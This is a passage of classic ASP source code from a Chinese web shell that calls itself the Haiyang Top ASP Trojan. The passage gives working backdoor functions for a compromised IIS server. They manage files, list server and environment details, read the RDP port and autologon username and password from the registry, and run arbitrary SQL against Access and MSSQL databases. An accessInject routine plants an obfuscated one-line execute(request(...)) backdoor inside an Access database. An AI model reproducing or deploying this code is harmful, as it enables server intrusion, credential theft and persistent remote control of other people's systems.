				Call fsoX.CreateTextFile(thePath, False)
			 Else
				fsoX.CreateFolder(thePath)
			End If
			chkErr(Err)
			alertThenClose("文件(夹)新建成功,刷新后就可以看到效果!")
			Response.End
		End If
		
		echo "&lt;style>body{overflow:hidden;}&lt;/style>"
		echo "&lt;body topmargin=2>"
		echo "&lt;form method=post>"
		echo "&lt;input type=hidden name=""#"" value=Execute(Session(""#""))>"
		echo "&lt;input type=hidden name=thePath value=""" &amp; HtmlEncode(thePath) &amp; """>&lt;br/>新建: "
		echo "&lt;input type=radio name=isFile id=file value='True' checked>&lt;label for=file>文件&lt;/label> "
		echo "&lt;input type=radio name=isFile id=folder value='False'>&lt;label for=folder>文件夹&lt;/label>&lt;br/>"
		echo "&lt;input size=38 name=theName>&lt;hr/>"
		echo "&lt;input type=hidden name=theAct value=doNewOne>"
		echo "&lt;input type=submit name=newAct value=' 确定 '>" &amp; strJsCloseMe
		echo "&lt;/form>"
		echo "&lt;/body>&lt;br/>"
	End Sub
	
	Sub fsoPastOne(thePath)
		If isDebugMode = False Then
			On Error Resume Next
		End If
		Dim sessionPath
		sessionPath = Session(m &amp; "fsoThePath")
		
		If thePath = "" Or sessionPath = "" Then
			alertThenClose("参数错误!")
			Response.End
		End If
		
		If Right(thePath, 1) = "\" Then
			thePath = Left(thePath, Len(thePath) - 1)
		End If
		
		If Right(sessionPath, 1) = "\" Then
			sessionPath = Left(sessionPath, Len(sessionPath) - 1)
			If Session(m &amp; "fsoTheAct") = "cutOne" Then
				Call fsoX.MoveFolder(sessionPath, thePath &amp; "\" &amp; fsoX.GetFileName(sessionPath))
			 Else
				Call fsoX.CopyFolder(sessionPath, thePath &amp; "\" &amp; fsoX.GetFileName(sessionPath))
			End If
		 Else
			If Session(m &amp; "fsoTheAct") = "cutOne" Then
				Call fsoX.MoveFile(sessionPath, thePath &amp; "\" &amp; fsoX.GetFileName(sessionPath))
			 Else
				Call fsoX.CopyFile(sessionPath, thePath &amp; "\" &amp; fsoX.GetFileName(sessionPath))
			End If
		End If
		
		chkErr(Err)
	End Sub
	
	Sub fsoRename(thePath)
		If isDebugMode = False Then
			On Error Resume Next
		End If
		Dim theFile, fileName, theFolder
		fileName = Request("fileName")
		
		If thePath = "" Or fileName = "" Then
			alertThenClose("参数错误!")
			Response.End
		End If

		If Right(thePath, 1) = "\" Then
			Set theFolder = fsoX.GetFolder(thePath)
			theFolder.Name = fileName
			Set theFolder = Nothing
		 Else
			Set theFile = fsoX.GetFile(thePath)
			theFile.Name = fileName
			Set theFile = Nothing
		End If
		
		chkErr(Err)
	End Sub
	
	Sub showFsoRename(thePath)
		Dim theAct, fileName
		fileName = fsoX.getFileName(thePath)
		
		echo "&lt;style>body{overflow:hidden;}&lt;/style>"
		echo "&lt;body topmargin=2>"
		echo "&lt;form method=post>"
		echo "&lt;input type=hidden name=""#"" value=Execute(Session(""#""))>"
		echo "&lt;input type=hidden name=thePath value=""" &amp; HtmlEncode(thePath) &amp; """>&lt;br/>更名为:&lt;br/>"
		echo "&lt;input size=38 name=fileName value=""" &amp; HtmlEncode(fileName) &amp; """>&lt;hr/>"
		echo "&lt;input type=submit value=' 确定 '>"
		echo "&lt;input type=hidden name=theAct value=doRename>"
		echo "&lt;input type=button value=' 关闭 ' onclick='window.close();'>"
		echo "&lt;/form>"
		echo "&lt;/body>&lt;br/>"
	End Sub
	
	Sub showFsoDelOne(thePath)
		If isDebugMode = False Then
			On Error Resume Next
		End If
		Dim newAct, theFile
		newAct = Request("newAct")

		If newAct = "确认删除?" Then
			If Right(thePath, 1) = "\" Then
				thePath = Left(thePath, Len(thePath) - 1)
				Call fsoX.DeleteFolder(thePath, True)
			 Else
				Call fsoX.DeleteFile(thePath, True)
			End If
			chkErr(Err)
			alertThenClose("文件(夹)删除成功,刷新后就可以看到效果!")
			Response.End
		End If

		echo "&lt;style>body{margin:8;border:none;overflow:hidden;background-color:buttonface;}&lt;/style>"		
		echo "&lt;form method=post>&lt;br/>"
		echo "&lt;input type=hidden name=""#"" value=Execute(Session(""#""))>"
		echo HtmlEncode(thePath)
		echo "&lt;input type=hidden name=thePath value=""" &amp; HtmlEncode(thePath) &amp; """>"
		echo "&lt;input type=hidden name=theAct value=doDelOne>"
		echo "&lt;hr/>&lt;input type=submit name=newAct value='确认删除?'>&lt;input type=button value=' 关闭 ' onclick='window.close();'>"
		echo "&lt;/form>"
	End Sub
	
	Sub fsoTheAttributes(thePath)
		If isDebugMode = False Then
			On Error Resume Next
		End If
		Dim newAct, theFile, theFolder, theTitle
		newAct = Request("newAct")
		
		If Right(thePath, 1) = "\" Then
			Set theFolder = fsoX.GetFolder(thePath)
			If newAct = " 修改 " Then
				setMyTitle(theFolder)
			End If
				theTitle = getMyTitle(theFolder)
			Set theFolder = Nothing
		 Else
			Set theFile = fsoX.GetFile(thePath)
			If newAct = " 修改 " Then
				setMyTitle(theFile)
			End If
			theTitle = getMyTitle(theFile)
			Set theFile = Nothing
		End If
		
		chkErr(Err)
		theTitle = Replace(theTitle, vbNewLine, "&lt;br/>")
		echo "&lt;style>body{margin:8;overflow:hidden;}&lt;/style>"
		echo "&lt;form method=post>"
		echo "&lt;input type=hidden name=""#"" value=Execute(Session(""#""))>"
		echo "&lt;input type=hidden name=thePath value=""" &amp; HtmlEncode(thePath) &amp; """>"
		echo "&lt;input type=hidden name=theAct value=doModifyAttributes>"
		echo theTitle
		echo "&lt;hr/>&lt;input type=submit name=newAct value=' 修改 '>" &amp; strJsCloseMe
		echo "&lt;/form>"
	End Sub
	
	Function getMyTitle(theOne)
		If isDebugMode = False Then
			On Error Resume Next
		End If
		Dim strTitle
		strTitle = strTitle &amp; "路径: " &amp; theOne.Path &amp; "" &amp; vbNewLine
		strTitle = strTitle &amp; "大小: " &amp; getTheSize(theOne.Size) &amp; vbNewLine
		strTitle = strTitle &amp; "属性: " &amp; getAttributes(theOne.Attributes) &amp; vbNewLine
		strTitle = strTitle &amp; "创建时间: " &amp; theOne.DateCreated &amp; vbNewLine
		strTitle = strTitle &amp; "最后修改: " &amp; theOne.DateLastModified &amp; vbNewLine
		strTitle = strTitle &amp; "最后访问: " &amp; theOne.DateLastAccessed
		getMyTitle = strTitle
	End Function
	
	Sub setMyTitle(theOne)
		Dim i, myAttributes
		
		For i = 1 To Request("attributes").Count
			myAttributes = myAttributes + CInt(Request("attributes")(i))
		Next
		theOne.Attributes = myAttributes
		
		chkErr(Err)
		echo  "&lt;script>alert('该文件(夹)属性已按正确设置修改完成!');&lt;/script>"
	End Sub
	
	Function getAttributes(intValue)
		Dim strAtt
		strAtt = "&lt;input type=checkbox name=attributes value=4 {$system}>系统 "
		strAtt = strAtt &amp; "&lt;input type=checkbox name=attributes value=2 {$hidden}>隐藏 "
		strAtt = strAtt &amp; "&lt;input type=checkbox name=attributes value=1 {$readonly}>只读&amp;nbsp;&amp;nbsp;&amp;nbsp;"
		strAtt = strAtt &amp; "&lt;input type=checkbox name=attributes value=32 {$archive}>存档&lt;br/>　　&amp;nbsp; "
		strAtt = strAtt &amp; "&lt;input type=checkbox name=attributes {$normal} value=0>普通 "
		strAtt = strAtt &amp; "&lt;input type=checkbox name=attributes value=128 {$compressed}>压缩 "
		strAtt = strAtt &amp; "&lt;input type=checkbox name=attributes value=16 {$directory}>文件夹&amp;nbsp;"
		strAtt = strAtt &amp; "&lt;input type=checkbox name=attributes value=64 {$alias}>快捷方式"
'		strAtt = strAtt &amp; "&lt;input type=checkbox name=attributes value=8 {$volume}>卷标 "
		If intValue = 0 Then
			strAtt = Replace(strAtt, "{$normal}", "checked")
		End If
		If intValue >= 128 Then
			intValue = intValue - 128
			strAtt = Replace(strAtt, "{$compressed}", "checked")
		End If
		If intValue >= 64 Then
			intValue = intValue - 64
			strAtt = Replace(strAtt, "{$alias}", "checked")
		End If
		If intValue >= 32 Then
			intValue = intValue - 32
			strAtt = Replace(strAtt, "{$archive}", "checked")
		End If
		If intValue >= 16 Then
			intValue = intValue - 16
			strAtt = Replace(strAtt, "{$directory}", "checked")
		End If
		If intValue >= 8 Then
			intValue = intValue - 8
			strAtt = Replace(strAtt, "{$volume}", "checked")
		End If
		If intValue >= 4 Then
			intValue = intValue - 4
			strAtt = Replace(strAtt, "{$system}", "checked")
		End If
		If intValue >= 2 Then
			intValue = intValue - 2
			strAtt = Replace(strAtt, "{$hidden}", "checked")
		End If
		If intValue >= 1 Then
			intValue = intValue - 1
			strAtt = Replace(strAtt, "{$readonly}", "checked")
		End If
		getAttributes = strAtt
	End Function

	Sub PageInfoAboutSrv()
		Dim theAct
		theAct = Request("theAct")
		
		showTitle("服务器相关数据")
		
		Select Case theAct
			Case ""
				getSrvInfo()
				getSrvDrvInfo()
				getSiteRootInfo()
				getTerminalInfo()
			Case "getSrvInfo"
				getSrvInfo()
			Case "getSrvDrvInfo"
				getSrvDrvInfo()
			Case "getSiteRootInfo"
				getSiteRootInfo()
			Case "getTerminalInfo"
				getTerminalInfo()
		End Select
		
		echo "&lt;hr/>Powered By Marcos 2005.02"
	End Sub

	Sub getSrvInfo()
		If isDebugMode = False Then
			On Error Resume Next
		End If
		Dim i, sa, objWshSysEnv, aryExEnvList, strExEnvList, intCpuNum, strCpuInfo, strOS
		Set sa = Server.CreateObject("Shell.Application")
		strExEnvList = "SystemRoot$WinDir$ComSpec$TEMP$TMP$NUMBER_OF_PROCESSORS$OS$Os2LibPath$Path$PATHEXT$PROCESSOR_ARCHITECTURE$" &amp; _
					   "PROCESSOR_IDENTIFIER$PROCESSOR_LEVEL$PROCESSOR_REVISION"
		aryExEnvList = Split(strExEnvList, "$")
		
		Set objWshSysEnv = wsX.Environment("SYSTEM")
		chkErr(Err)

		intCpuNum = Request.ServerVariables("NUMBER_OF_PROCESSORS")
		If IsNull(intCpuNum) Or intCpuNum = "" Then
			intCpuNum = objWshSysEnv("NUMBER_OF_PROCESSORS")
		End If
		strOS = Request.ServerVariables("OS")
		If IsNull(strOS) Or strOS = "" Then
			strOS = objWshSysEnv("OS")
			strOs = strOs &amp; "(有可能是 Windows2003 哦)"
		End If
		strCpuInfo = objWshSysEnv("PROCESSOR_IDENTIFIER")

		echo "&lt;a href=javascript:showHideMe(srvInf);>服务器相关参数:&lt;/a>"
		echo "&lt;ol id=srvInf>&lt;hr/>"
		echo "&lt;li>服务器名: " &amp; Request.ServerVariables("SERVER_NAME") &amp; "&lt;/li>"
		echo "&lt;li>服务器IP: " &amp; Request.ServerVariables("LOCAL_ADDR") &amp; "&lt;/li>"
		echo "&lt;li>服务端口: " &amp; Request.ServerVariables("SERVER_PORT") &amp; "&lt;/li>"
		echo "&lt;li>服务器内存: " &amp; getTheSize(sa.GetSystemInformation("PhysicalMemoryInstalled")) &amp; "&lt;/li>"
		echo "&lt;li>服务器时间: " &amp; Now &amp; "&lt;/li>"
		echo "&lt;li>服务器软件: " &amp; Request.ServerVariables("SERVER_SOFTWARE") &amp; "&lt;/li>"
		echo "&lt;li>脚本超时时间: " &amp; Server.ScriptTimeout &amp; "&lt;/li>"
		echo "&lt;li>服务器CPU数量: " &amp; intCpuNum &amp; "&lt;/li>"
		echo "&lt;li>服务器CPU详情: " &amp; strCpuInfo &amp; "&lt;/li>"
		echo "&lt;li>服务器操作系统: " &amp; strOS &amp; "&lt;/li>"
		echo "&lt;li>服务器解译引擎: " &amp; ScriptEngine &amp; "/" &amp; ScriptEngineMajorVersion &amp; "." &amp; ScriptEngineMinorVersion &amp; "." &amp; ScriptEngineBuildVersion &amp; "&lt;/li>"
		echo "&lt;li>本文件实际路径: " &amp; Request.ServerVariables("PATH_TRANSLATED") &amp; "&lt;/li>"
		echo "&lt;hr/>&lt;/ol>"
		
		echo "&lt;br/>&lt;a href=javascript:showHideMe(srvEnvInf);>服务器相关参数:&lt;/a>"
		echo "&lt;ol id=srvEnvInf>&lt;hr/>"
		For i = 0 To UBound(aryExEnvList)
			echo "&lt;li>" &amp; aryExEnvList(i) &amp; ": " &amp; wsX.ExpandEnvironmentStrings("%" &amp; aryExEnvList(i) &amp; "%") &amp; "&lt;/li>"
		Next
		echo "&lt;hr/>&lt;/ol>"
		
		Set sa = Nothing
		Set objWshSysEnv = Nothing
	End Sub

	Sub getSrvDrvInfo()
		If isDebugMode = False Then
			On Error Resume Next
		End If
		Dim objTheDrive
		echo "&lt;br/>&lt;a href=javascript:showHideMe(srvDriveInf);>服务器磁盘信息:&lt;/a>"
		echo "&lt;ol id=srvDriveInf>&lt;hr/>"
		echo "&lt;div id='fsoDriveList'>"
		echo "&lt;span>盘符&lt;/span>&lt;span>类型&lt;/span>&lt;span>卷标&lt;/span>&lt;span>文件系统&lt;/span>&lt;span>可用空间&lt;/span>&lt;span>总空间&lt;/span>&lt;br/>"
		For Each objTheDrive In fsoX.Drives
			echo "&lt;span>" &amp; objTheDrive.DriveLetter &amp; "&lt;/span>"
			echo "&lt;span>" &amp; getDriveType(objTheDrive.DriveType) &amp; "&lt;/span>"
			If UCase(objTheDrive.DriveLetter) = "A" Then
				echo "&lt;br/>"
			 Else
				echo "&lt;span>" &amp; objTheDrive.VolumeName &amp; "&lt;/span>"
				echo "&lt;span>" &amp; objTheDrive.FileSystem &amp; "&lt;/span>"
				echo "&lt;span>" &amp; getTheSize(objTheDrive.FreeSpace) &amp; "&lt;/span>"
				echo "&lt;span>" &amp; getTheSize(objTheDrive.TotalSize) &amp; "&lt;/span>&lt;br/>"
			End If
			If Err Then
				Err.Clear
				echo "&lt;br/>"
			End If
		Next
		echo "&lt;/div>&lt;hr/>&lt;/ol>"
		Set objTheDrive = Nothing
	End Sub
	
	Sub getSiteRootInfo()
		If isDebugMode = False Then
			On Error Resume Next
		End If
		Dim objTheFolder
		Set objTheFolder = fsoX.GetFolder(Server.MapPath("/"))
		echo "&lt;br/>&lt;a href=javascript:showHideMe(siteRootInfo);>站点根目录信息:&lt;/a>"
		echo "&lt;ol id=siteRootInfo>&lt;hr/>"
		echo "&lt;li>物理路径: " &amp; Server.MapPath("/") &amp; "&lt;/li>"
		echo "&lt;li>当前大小: " &amp; getTheSize(objTheFolder.Size) &amp; "&lt;/li>"
		echo "&lt;li>文件数: " &amp; objTheFolder.Files.Count &amp; "&lt;/li>"
		echo "&lt;li>文件夹数: " &amp; objTheFolder.SubFolders.Count &amp; "&lt;/li>"
		echo "&lt;li>创建日期: " &amp; objTheFolder.DateCreated &amp; "&lt;/li>"
		echo "&lt;li>最后访问日期: " &amp; objTheFolder.DateLastAccessed &amp; "&lt;/li>"
		echo "&lt;/ol>"
	End Sub
	
	Sub getTerminalInfo()
		If isDebugMode = False Then
			On Error Resume Next
		End If
		Dim terminalPortPath, terminalPortKey, termPort
		Dim autoLoginPath, autoLoginUserKey, autoLoginPassKey
		Dim isAutoLoginEnable, autoLoginEnableKey, autoLoginUsername, autoLoginPassword

		terminalPortPath = "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp\"
		terminalPortKey = "PortNumber"
		termPort = wsX.RegRead(terminalPortPath &amp; terminalPortKey)

		echo "终端服务端口及自动登录信息&lt;hr/>&lt;ol>"
		If termPort = "" Or Err.Number &lt;> 0 Then 
			echo  "无法得到终端服务端口, 请检查权限是否已经受到限制.&lt;br/>"
		 Else
			echo  "当前终端服务端口: " &amp; termPort &amp; "&lt;br/>"
		End If
		
		autoLoginPath = "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\"
		autoLoginEnableKey = "AutoAdminLogon"
		autoLoginUserKey = "DefaultUserName"
		autoLoginPassKey = "DefaultPassword"
		isAutoLoginEnable = wsX.RegRead(autoLoginPath &amp; autoLoginEnableKey)
		If isAutoLoginEnable = 0 Then
			echo  "系统自动登录功能未开启&lt;br/>"
		Else
			autoLoginUsername = wsX.RegRead(autoLoginPath &amp; autoLoginUserKey)
			echo  "自动登录的系统帐户: " &amp; autoLoginUsername &amp; "&lt;br>"
			autoLoginPassword = wsX.RegRead(autoLoginPath &amp; autoLoginPassKey)
			If Err Then
				Err.Clear
				echo  "False"
			End If
			echo  "自动登录的帐户密码: " &amp; autoLoginPassword &amp; "&lt;br>"
		End If
		echo "&lt;/ol>"
	End Sub

	Sub PageLogin()
		Dim theAct, passWord
		theAct = Request("theAct")
		passWord = Request("userPassword")
		
		showTitle("管理登录")
		
		If theAct = "chkLogin" Then
			If passWord = userPassword Then
				Session(m &amp; "userPassword") = passWord
				redirectTo("?%23=Execute(Session(%22%23%22))&amp;pageName=PageList")
			 Else
				echo "&lt;script language=javascript>alert('啊哦,登录失败了...');history.back();&lt;/script>"
			End If
		End If
		
		echo "&lt;style>body{margin:8;text-align:center;}&lt;/style>"
		echo "海阳顶端网ASP木马@2006&lt;hr/>"
		echo "&lt;body onload=document.forms[0].userPassword.focus();>"
		echo "&lt;form method=post onsubmit=this.Submit.disabled=true;>"
		echo "&lt;input type=hidden name=""#"" value=Execute(Session(""#""))>"
		echo "&lt;input name=userPassword class=input type=password size=30> "
		echo "&lt;input type=hidden name=theAct value=chkLogin>"
		echo "&lt;input type=submit name=Submit value=""" &amp; HtmlEncode(myName) &amp; """ class=input>"
		echo "&lt;hr/>"
		echo "本版感谢: Kevin,注册表各键值的收集工作"
		echo "&lt;br/>WWW.HAIYANGTOP.NET,WWW.HIDIDI.NET 2005.02"
		echo "&lt;/form>"
		echo "&lt;body>"
	End Sub

	Sub pageMsDataBase()
		Dim theAct, sqlStr
		theAct = Request("theAct")
		sqlStr = Request("sqlStr")
		
		showTitle("mdb+mssql数据库操作页")
		
		If sqlStr = "" Then
			If Session(m &amp; "sqlStr") = "" Then
				sqlStr = "e:\hytop.mdb或sql:Provider=SQLOLEDB.1;Server=localhost;User ID=sa;Password=haiyangtop;Database=bbs;"
			 Else
				sqlStr = Session(m &amp; "sqlStr")
			End If
		End If
		Session(m &amp; "sqlStr") = sqlStr
		
		echo "&lt;style>body{margin:8;}&lt;/style>"
		echo "&lt;form method=post action='?pageName=MsDataBase&amp;theAct=showTables' onSubmit='this.Submit.disabled=true;'>"
		echo "&lt;input type=hidden name=""#"" value=Execute(Session(""#""))>"
		echo "&lt;a href='?%23=Execute(Session(%22%23%22))&amp;pageName=MsDataBase'>mdb+mssql数据库操作&lt;/a>&lt;br/>"
		echo "&lt;input name=sqlStr type=text id=sqlStr value=""" &amp; sqlStr &amp; """ size=60 style='width:80%;'>"
		echo "&lt;input name=theAct type=hidden value=showTables>&lt;br/>"
		echo "&lt;input type=Submit name=Submit value=' 提交 '>"
		echo "&lt;input type=button name=Submit2 value=' 插入 ' onclick=""if(confirm('这里是在ACESS数据里插入海阳顶端网ASP后门\n默认密码是" &amp; clientPassword &amp; "\n后门插入后可以使用的前提是\n数据库是asp后缀, 并且没有错乱asp代码\n确认操作吗?')){location.href='?%23=Execute(Session(%22%23%22))&amp;pageName=MsDataBase&amp;theAct=inject&amp;sqlStr='+this.form.sqlStr.value;this.disabled=true;}"">"
		echo "&lt;input type=button value=' 示例 ' onclick=""this.form.sqlStr.value='e:\\HYTop.mdb或sql:Provider=SQLOLEDB.1;Server=localhost;User ID=sa;Password=haiyangtop;Database=bbs;';"">"
		echo "&lt;/form>"
		echo "&lt;hr/>注: 插入只针对ACCESS操作, 要浏览ACCESS在表单中的写法是""d:\bbs.mdb"", SQL据库写法是""sql:连接字符串"", 不要忘写sql:。&lt;hr/>"

		Select Case theAct
			Case "showTables"
				showTables()
			Case "query"
				showQuery()
			Case "inject"
				accessInject()
		End Select
		
		echo "Powered By Marcos 2005.02"
	End Sub
	
	Sub showTables()
		If isDebugMode = False Then
			On Error Resume Next
		End If
		Dim conn, sqlStr, rsTable, rsColumn, connStr, tablesStr
		sqlStr = Request("sqlStr")
		If LCase(Left(sqlStr, 4)) = "sql:" Then
			connStr = Mid(sqlStr, 5)
		 Else
			connStr = "Provider=Microsoft.Jet.Oledb.4.0;Data Source=" &amp; sqlStr
		End If
		Set conn = Server.CreateObject("Adodb.Connection")
		
		conn.Open connStr
		chkErr(Err)
		
		tablesStr = getTableList(conn, sqlStr, rsTable)
		
		echo "&lt;a href=""?%23=Execute(Session(%22%23%22))&amp;pageName=MsDataBase&amp;theAct=showTables&amp;sqlStr=" &amp; UrlEncode(sqlStr)  &amp; """>数据库表结构查看:&lt;/a>&lt;br/>"
		echo tablesStr &amp; "&lt;hr/>"
		echo "&lt;a href=""?%23=Execute(Session(%22%23%22))&amp;pageName=MsDataBase&amp;theAct=query&amp;sqlStr=" &amp; UrlEncode(sqlStr) &amp; """>转到SQL命令执行&lt;/a>&lt;hr/>"

		Do Until rsTable.Eof
			Set rsColumn = conn.OpenSchema(4, Array(Empty, Empty, rsTable("Table_Name").value))
			echo "&lt;table border=0 cellpadding=0 cellspacing=0>&lt;tr>&lt;td height=22 colspan=6>&lt;b>" &amp; rsTable("Table_Name") &amp; "&lt;/b>&lt;/td>"
			echo "&lt;/tr>&lt;tr>&lt;td colspan=6>&lt;hr/>&lt;/td>&lt;/tr>&lt;tr align=center>"
			echo "&lt;td>字段名&lt;/td>&lt;td>类型&lt;/td>&lt;td>大小&lt;/td>&lt;td>精度&lt;/td>&lt;td>允许为空&lt;/td>&lt;td>默认值&lt;/td>&lt;/tr>"
			echo "&lt;tr>&lt;td colspan=6>&lt;hr/>&lt;/td>&lt;/tr>"

			Do Until rsColumn.Eof
				echo "&lt;tr align=center>"
				echo "&lt;td align=Left>&amp;nbsp;" &amp; rsColumn("Column_Name") &amp; "&lt;/td>"
				echo "&lt;td width=80>" &amp; getDataType(rsColumn("Data_Type")) &amp; "&lt;/td>"
				echo "&lt;td width=70>" &amp; rsColumn("Character_Maximum_Length") &amp; "&lt;/td>"
				echo "&lt;td width=70>" &amp; rsColumn("Numeric_Precision") &amp; "&lt;/td>"
				echo "&lt;td width=70>" &amp; rsColumn("Is_Nullable") &amp; "&lt;/td>"
				echo "&lt;td width=80>" &amp; rsColumn("Column_Default") &amp; "&lt;/td>"
				echo "&lt;/tr>"
				rsColumn.MoveNext
			Loop
			
			echo "&lt;tr>&lt;td colspan=6>&lt;hr/>&lt;/td>&lt;/tr>&lt;/table>"
			rsTable.MoveNext
		Loop

		echo "&lt;hr/>"

		conn.Close
		Set conn = Nothing
		Set rsTable = Nothing
		Set rsColumn = Nothing
	End Sub
	
	Sub showQuery()
		If isDebugMode = False Then
			On Error Resume Next
		End If
		Dim i, j, rs, sql, page, conn, sqlStr, connStr, rsTable, tablesStr, theTable
		sql = Request("sql")
		page = Request("page")
		sqlStr = Request("sqlStr")
		theTable = Request("theTable")
		
		If Not IsNumeric(page) or page = "" Then
			page = 1
		End If
		
		If sql = "" And theTable &lt;> "" Then
			sql = "Select top " &amp; dbSelectNumber &amp; " * from [" &amp; theTable &amp; "]"
		End If
		
		If LCase(Left(sqlStr, 4)) = "sql:" Then
			connStr = Mid(sqlStr, 5)
		 Else
			connStr = "Provider=Microsoft.Jet.Oledb.4.0;Data Source=" &amp; sqlStr
		End If
		Set rs = Server.CreateObject("Adodb.RecordSet")
		Set conn = Server.CreateObject("Adodb.Connection")
	
		conn.Open connStr
		chkErr(Err)
		
		tablesStr = getTableList(conn, sqlStr, rsTable)

		echo "&lt;a href=""?%23=Execute(Session(%22%23%22))&amp;pageName=MsDataBase&amp;theAct=showTables&amp;sqlStr=" &amp; UrlEncode(sqlStr)  &amp; """>数据库表结构查看:&lt;/a>&lt;br/>"
		echo tablesStr &amp; "&lt;hr/>"
		echo "&lt;a href=?%23=Execute(Session(%22%23%22))&amp;pageName=MsDataBase&amp;theAct=query&amp;sqlStr=" &amp; UrlEncode(sqlStr) &amp; "&amp;sql=" &amp; UrlEncode(sql) &amp; ">SQL命令执行及查看&lt;/a>"
		echo "&lt;br/>&lt;form method=post action=""?pageName=MsDataBase&amp;theAct=query&amp;sqlStr=" &amp; UrlEncode(sqlStr) &amp; """>"
		echo "&lt;input type=hidden name=""#"" value=Execute(Session(""#""))>"
		echo "&lt;input name=sql type=text id=sql value=""" &amp; HtmlEncode(sql) &amp; """ size=60>"
		echo "&lt;input type=Submit name=Submit4 value=执行查询>&lt;hr/>"

		If sql &lt;> "" And Left(LCase(sql), 7) = "select " Then
			rs.Open sql, conn, 1, 1
			chkErr(Err)
			rs.PageSize = 20
			If Not rs.Eof Then
				rs.AbsolutePage = page
			End If
			If rs.Fields.Count>0 Then
				echo "&lt;br>&lt;table border=""1"" cellpadding=""0"" cellspacing=""0"" width=""98%"">"
				echo "&lt;tr>"
				echo "&lt;td height=""22"" align=""center"" class=""tr"" colspan=""" &amp; rs.Fields.Count &amp; """>SQL操作 - 执行结果&lt;/td>"
				echo "&lt;/tr>"
				echo "&lt;tr>"
				For j = 0 To rs.Fields.Count-1
					echo "&lt;td height=""22"" align=""center"" class=""td""> " &amp; rs.Fields(j).Name &amp; " &lt;/td>"
				Next
				For i = 1 To 20
					If rs.Eof Then
						Exit For
					End If
					echo "&lt;/tr>"
					echo "&lt;tr valign=top>"
					For j = 0 To rs.Fields.Count-1
						echo "&lt;td height=""22"" align=""center"">" &amp; HtmlEncode(fixNull(rs(j))) &amp; "&lt;/td>"
					Next
					echo "&lt;/tr>"
					rs.MoveNext
				Next
			End If
			echo "&lt;tr>"
			echo "&lt;td height=""22"" align=""center"" class=""td"" colspan=""" &amp; rs.Fields.Count &amp; """>"
			For i = 1 To rs.PageCount
				echo Replace("&lt;a href=""?%23=Execute(Session(%22%23%22))&amp;pageName=MsDataBase&amp;theAct=query&amp;sqlStr=" &amp; UrlEncode(sqlStr) &amp; "&amp;sql=" &amp; UrlEncode(sql) &amp; "&amp;page=" &amp; i &amp; """>&lt;font {$font" &amp; i &amp; "}>" &amp; i &amp; "&lt;/font>&lt;/a> ", "{$font" &amp; page &amp; "}", "class=warningColor")
			Next
			echo "&lt;/td>&lt;/tr>&lt;/table>"
			rs.Close
		 Else
		 	If sql &lt;> "" Then
				conn.Execute(sql)
				chkErr(Err)
				echo "&lt;center>&lt;br>执行完毕!&lt;/center>"
			End If
		End If

		echo "&lt;/form>&lt;hr/>"

		conn.Close
		Set rs = Nothing
		Set conn = Nothing
		Set rsTable = Nothing
	End Sub
	
	Function getDataType(typeId)
		Select Case typeId
			Case 130
				getDataType = "文本"
			Case 2
				getDataType = "整型"
			Case 3
				getDataType = "长整型"
			Case 7
				getDataType = "日期/时间"
			Case 5
				getDataType = "双精度型"
			Case 11
				getDataType = "是/否"
			Case 128
				getDataType = "OLE 对象"
			Case Else
				getDataType = typeId
		End Select
	End Function
	
	Sub accessInject()
		If isDebugMode = False Then
			On Error Resume Next
		End If
		Dim rs, conn, sqlStr, connStr
		sqlStr = Request("sqlStr")
		If LCase(Left(sqlStr, 4)) = "sql:" Then
			showErr("插入只对ACCESS数据库有效!")
		 Else
			connStr = "Provider=Microsoft.Jet.Oledb.4.0;Data Source=" &amp; sqlStr
		End If
		Set rs = Server.CreateObject("Adodb.RecordSet")
		Set conn = Server.CreateObject("Adodb.Connection")

		conn.Open connStr
		chkErr(Err)

		If notdownloadsExists = True Then
			conn.Execute("drop table notdownloads")
		End If

		conn.Execute("create table notdownloads(notdownloads oleobject)")

		rs.Open "notdownloads", conn, 1, 3
		rs.AddNew
		rs("notdownloads").AppendChunk(ChrB(Asc("&lt;")) &amp; ChrB(Asc("%")) &amp; ChrB(Asc("e")) &amp; ChrB(Asc("x")) &amp; ChrB(Asc("e")) &amp; ChrB(Asc("c")) &amp; ChrB(Asc("u")) &amp; ChrB(Asc("t")) &amp; ChrB(Asc("e")) &amp; ChrB(Asc("(")) &amp; ChrB(Asc("r")) &amp; ChrB(Asc("e")) &amp; ChrB(Asc("q")) &amp; ChrB(Asc("u")) &amp; ChrB(Asc("e")) &amp; ChrB(Asc("s")) &amp; ChrB(Asc("t")) &amp; ChrB(Asc("(")) &amp; ChrB(Asc("""")) &amp; ChrB(Asc(clientPassword)) &amp; ChrB(Asc("""")) &amp; ChrB(Asc(")")) &amp; ChrB(Asc(")")) &amp; ChrB(Asc("%")) &amp; ChrB(Asc(">")) &amp; ChrB(Asc(" ")))
	    rs.Update
    	rs.Close
		
		echo "&lt;script language=""javascript"">alert('插入成功!');history.back();&lt;/script>"
		
		conn.Close
		Set rs = Nothing
		Set conn = Nothing
	End Sub
	
	Function getTableList(conn, sqlStr, rsTable)
		Set rsTable = conn.OpenSchema(20, Array(Empty, Empty, Empty, "table"))

		Do Until rsTable.Eof
			getTableList = getTableList &amp; "&lt;a href=""?%23=Execute(Session(%22%23%22))&amp;pageName=MsDataBase&amp;theAct=query&amp;sqlStr=" &amp; UrlEncode(sqlStr) &amp; "&amp;theTable=" &amp; UrlEncode(rsTable("Table_Name")) &amp; """>[" &amp; rsTable("Table_Name") &amp; "]&lt;/a>&amp;nbsp;"
			rsTable.MoveNext
		Loop
		rsTable.MoveFirst
	End Function

	Sub PageObjOnSrv()
		Dim i, objTmp, txtObjInfo, strObjectList, strDscList
		txtObjInfo = Trim(Request("txtObjInfo"))

		strObjectList = "MSWC.AdRotator,MSWC.BrowserType,MSWC.NextLink,MSWC.Tools,MSWC.Status,MSWC.Counters,IISSample.ContentRotator," &amp; _
						"IISSample.PageCounter,MSWC.PermissionChecker,Adodb.Connection,SoftArtisans.FileUp,SoftArtisans.FileManager,LyfUpload.UploadFile," &amp; _
						"Persits.Upload.1,W3.Upload,JMail.SmtpMail,CDONTS.NewMail,Persits.MailSender,SMTPsvg.Mailer,DkQmail.Qmail,Geocel.Mailer," &amp; _
						"IISmail.Iismail.1,SmtpMail.SmtpMail.1,SoftArtisans.ImageGen,W3Image.Image," &amp; _
						"Scripting.FileSystemObject,Adodb.Stream,Shell.Application,WScript.Shell,Wscript.Network"
